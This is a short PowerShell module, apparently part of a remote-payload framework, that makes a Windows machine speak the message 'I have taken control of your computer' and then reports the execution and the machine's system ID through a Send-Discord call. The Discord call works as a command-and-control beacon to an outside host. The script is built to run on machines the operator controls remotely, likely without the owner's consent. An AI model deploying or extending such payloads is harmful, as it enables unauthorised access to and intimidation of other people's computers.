# ============================================================
# Text to Speech for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID

$message = if ($env:MSG) { $env:MSG } else { "Hello, I have taken control of your computer. This is a security test." }

# Use Windows Speech Synthesis
Add-Type -AssemblyName System.Speech
$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.Speak($message)

Send-Discord "🔊 **TTS Executed on $sysid**`nMessage: ``$message``"
